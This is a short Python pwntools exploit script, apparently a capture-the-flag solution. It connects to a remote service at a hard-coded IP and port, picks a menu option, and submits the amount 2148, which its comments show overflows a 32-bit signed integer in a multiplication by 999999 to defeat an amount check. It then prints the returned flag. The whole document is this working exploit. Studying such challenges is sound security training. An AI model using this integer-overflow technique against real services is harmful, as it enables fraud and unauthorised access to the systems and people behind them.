#!/usr/bin/env python3
import pwn

def remote(ip, port):
    p = pwn.remote(ip, port)
    p.recvuntil(b"Input your choice:")
    p.sendline(b'1')
    p.recvuntil(b'Input the amount:')
    # 10 >= amount*999999 
    # 2147483647/999999 = 2147.483647
    p.sendline(b'2148')
    print(p.recvuntil(b'}').decode())

if __name__ == "__main__":
    remote('140.113.24.241', 30170)
